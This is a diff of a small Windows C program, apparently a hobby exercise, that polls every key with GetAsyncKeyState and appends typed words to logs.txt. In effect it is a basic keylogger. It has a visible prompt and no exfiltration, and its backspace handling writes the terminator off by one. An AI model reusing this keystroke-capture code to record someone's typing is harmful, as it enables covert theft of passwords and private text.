@@ -8,13 +8,13 @@ int main()
     char palavra[100];
     int count = 0;
     
-    printf("Precione qualquer tecla");
+    printf("Precione qualquer tecla...\n\n");
 
     while (1)
     {
         for (int vk = 0x08; vk <= 0xFE; vk++)
         {
-            if (GetAsyncKeyState(vk) & 0x8000)
+            if (GetAsyncKeyState(vk) & 0x01)
             {
                 // Mapeia o código virtual para scan code
                 UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
@@ -24,33 +24,38 @@ int main()
 
                 // Buffer para o nome da tecla
                 char keyName[128];
-                if (GetKeyNameText(lParam, keyName, sizeof(keyName)) > 0)
+                if (GetKeyNameTextA(lParam, keyName, sizeof(keyName)) > 0)
                 {
-                    if (scanCode == 14)
+
+                    // Backspace
+                    if (vk == VK_BACK)
                     {
-                        if (count <= 0) continue;
+                        if (count > 0)
+                        {
+                            palavra[count--] = '\0';
+                        }
                         system("cls");
-                        palavra[count--] = '\0';
                         printf("%s", palavra);
                         continue;
                     }
                     
-                    if (scanCode == 57 || scanCode == 28)
+                    // Enter ou espaço, salva o arquivo
+                    if (vk == VK_RETURN || vk == VK_SPACE)
                     {
                         if (count > 0)
                         {
-                            system("cls");
-
+                            
                             // Finalizando o arquivo log txt
                             palavra[count] = '\0';
-
+                            
                             // Salavando arquivo
                             fptr = fopen("logs.txt", "a");
                             fprintf(fptr, "%s\n", palavra);
                             fclose(fptr);
-
-                            palavra[0] = '\0';
+                            
                             count = 0;
+                            palavra[0] = '\0';
+                            system("cls");
                         }
                         continue;
                     }
